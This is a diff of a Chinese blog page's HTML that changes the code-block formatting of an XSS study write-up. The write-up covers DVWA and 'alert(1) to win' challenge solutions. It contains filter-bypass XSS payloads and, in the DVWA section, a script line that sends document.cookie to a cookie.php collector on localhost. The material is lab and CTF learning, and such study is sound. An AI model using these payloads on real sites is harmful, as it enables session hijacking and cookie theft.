@@ -484,10 +484,18 @@
 </ul>
 <p>网页中运行JavaScript的方式</p>
 <p>1.引入外部js</p>
-<pre><code>&lt;script src=&quot;https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js&quot;&lt;/script&gt;</code></pre><p>2.使用超链接（javascript伪协议）</p>
-<pre><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;</code></pre><p>3.使用标签</p>
-<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>4.使用事件方法</p>
-<pre><code>&lt;img src=1 onerror=alert(1)&gt;</code></pre><p>常见事件：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">script</span> src=<span class="string">"https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js"</span>&lt;/<span class="keyword">script</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2.使用超链接（javascript伪协议）</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>3.使用标签</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>4.使用事件方法</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=1 <span class="attribute">onerror</span>=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>常见事件：</p>
 <table>
 <thead>
 <tr>
@@ -563,7 +571,8 @@
 <img src="C:\Users\尚慧亮\Desktop\QQ截图20200112124443.png" style="zoom: 50%;" />
 
 <p>回到dvwa中构造攻击语句：</p>
-<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://127.0.0.1/cookie.php?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.location=<span class="string">'http://127.0.0.1/cookie.php?cookie='</span>+<span class="built_in">document</span>.cookie&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>得到cookie:</p>
 <img src="C:\Users\尚慧亮\Desktop\QQ截图20200112124855.png" style="zoom:33%;" />
 
@@ -716,60 +725,38 @@
 
 <p>点击刷新即可通关。</p>
 <h3 id="XSS——alert-1-to-win"><a href="#XSS——alert-1-to-win" class="headerlink" title="XSS——alert(1)to win"></a>XSS——alert(1)to win</h3><p><strong>Warmup</strong></p>
-<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword">return</span> <span class="token string">'&lt;script>console.log("'</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">'");&lt;/script>'</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>代码直接拼接了输入的字符串，没有进行任何有效的过滤，我们尝试闭合即可。</p>
 <p>")闭合前面的双引号和括号，后面使用// 或<!--注释“</p>
 <p>尝试：<code>&quot;);alert(1) //</code>成功</p>
 <p>也可以闭合前面的<script>标签</p>
 <p>尝试:<code>&lt;/script&gt;;&lt;script&gt;alert(1)&lt;!--</code>成功</p>
 <p><strong>Adobe</strong></p>
-<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">"/g, '\\"</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> <span class="token string">'&lt;script>console.log("'</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">'");&lt;/script>'</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>代码将输入的双引号用\进行了转义，所以无法通过进行双引号的闭合。</p>
 <p>但我们还可以通过<script>标签闭合绕过。</p>
 <p>或者在输入的双引号前在加一个\对转义双引号的\进行转义。如下：</p>
 <p>尝试<code>\&quot;);alert(1)//</code></p>
 <p><strong>JSON</strong></p>
-<pre><code>function escape(s) {
-  s = JSON.stringify(s);
-  return &#39;&lt;script&gt;console.log(&#39; + s + &#39;);&lt;/script&gt;&#39;;
-}</code></pre><p>JSON 通常用于与服务端交换数据。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = <span class="built_in">JSON</span>.stringify(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span> + s + <span class="string">');&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>JSON 通常用于与服务端交换数据。</p>
 <p>在向服务器发送数据时一般是字符串。</p>
 <p>我们可以使用 JSON.stringify() 方法将 JavaScript 对象转换为字符串。</p>
 <p>过滤了,"等字符。</p>
 <p>尝试<code>&lt;/script&gt;&lt;script&gt;alert(1)//</code>成功</p>
 <p><strong>Markdown</strong></p>
-<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword">var</span> text <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&lt;/g</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/"/g</span><span class="token punctuation">,</span> <span class="token string">'&amp;quot;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token comment" spellcheck="true">// URLs</span>
-    text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(http:\/\/\S+)/g</span><span class="token punctuation">,</span> <span class="token string">'&lt;a href="$1">$1&lt;/a>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token comment" spellcheck="true">// [[img123|Description]]</span>
-    text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\[\[(\w+)\|(.+?)\]\]/g</span><span class="token punctuation">,</span> <span class="token string">'&lt;img alt="$2" src="$1.gif">'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> text<span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> text = s.replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>);</span><br><span class="line">    <span class="comment">// URLs</span></span><br><span class="line">    text = text.replace(<span class="regexp">/(http:\/\/\S+)/g</span>, <span class="string">'&lt;a href="$1"&gt;$1&lt;/a&gt;'</span>);</span><br><span class="line">    <span class="comment">// [[img123|Description]]</span></span><br><span class="line">    text = text.replace(<span class="regexp">/\[\[(\w+)\|(.+?)\]\]/g</span>, <span class="string">'&lt;img alt="$2" src="$1.gif"&gt;'</span>);</span><br><span class="line">    <span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>s.replace将<strong>< "</strong>转换成立HTML实体</p>
 <p>text.replace意思为判断输入中是否含有http://,如果有就生成一个a标签,</p>
 <p>第三波，如果字符串包含<code>[[img_src|img_alt]]</code>格式的字符串，则变为</p>
 <p><code>&lt;img alt=&quot;img_alt&quot; src=&quot;img_src.gif&quot;&gt;</code></p>
 <p><strong>Fruit</strong></p>
-<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// CVE-2016-4618</span>
-<span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token keyword">var</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span>implementation<span class="token punctuation">.</span><span class="token function">createHTMLDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  div<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> s<span class="token punctuation">;</span>
-  <span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'SCRIPT'</span> <span class="token operator">===</span> n<span class="token punctuation">.</span>tagName<span class="token punctuation">)</span> n<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>n<span class="token punctuation">.</span>attributes<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-      <span class="token keyword">var</span> name <span class="token operator">=</span> n<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>
-      <span class="token keyword">if</span> <span class="token punctuation">(</span>name <span class="token operator">!==</span> <span class="token string">'class'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> n<span class="token punctuation">.</span><span class="token function">removeAttribute</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span>
-  <span class="token punctuation">}</span>
-  <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>div<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">return</span> div<span class="token punctuation">.</span>innerHTML<span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CVE-2016-4618</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> div = <span class="built_in">document</span>.implementation.createHTMLDocument().createElement(<span class="string">'div'</span>);</span><br><span class="line">  div.innerHTML = s;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'SCRIPT'</span> === n.tagName) n.parentNode.removeChild(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;n.attributes.length; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> name = n.attributes[i].name;</span><br><span class="line">      <span class="keyword">if</span> (name !== <span class="string">'class'</span>) &#123; n.removeAttribute(name); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [].map.call(div.querySelectorAll(<span class="string">'*'</span>), f);</span><br><span class="line">  <span class="keyword">return</span> div.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>代码给出了漏洞编号,查了一下得知；</p>
 <p>问题来源于代码的逻辑不严谨，在<code>for</code>循环中，代码通过<code>n.attributes.length</code>来判断边界条件，但是<code>n.attributes.length</code>是动态变化的，如果存在多个属性，则最后一个属性是无法删除的，只要我们构造多个属性即可。</p>
 <p><code>&lt;iframe t onload=alert(1)&gt;</code></p>
@@ -789,7 +776,11 @@
 <p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120204137.png)</p>
 <h5 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h5><p>\w+:多个 英文字母或数字或下划线组成的<br> /?: 0个或1个/<br> g: 全局匹配<br> i: 不区分大小写</p>
 <p>这里过滤了<多个字母或数字> 也就是说 <a>, </a> <111> 全部替换成空，可以用低优先级来解决去掉末尾的></p>
-<pre><code>&lt;body onload=&quot;alert(1)&quot;</code></pre><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120204654.png)</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">body</span> onload=<span class="string">"alert(1)"</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120204654.png)</p>
 <h5 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h5><p>​      代码中将</style>标签替换成/ u574Fu4EBA /，且忽略大小写；正则的目的在于防止我们闭合<style>标签，但是这里我们依然可以通过换行绕过正则进行闭合。</p>
 <p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120204809.png)</p>
 <h5 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h5><p>代码要求我们以<a href="https://www.segmentfault.com开头，输入点是在" target="_blank" rel="noopener">https://www.segmentfault.com开头，输入点是在</a><>标签中，我们可以用</script>闭合前面 在后面加注释绕过</p>
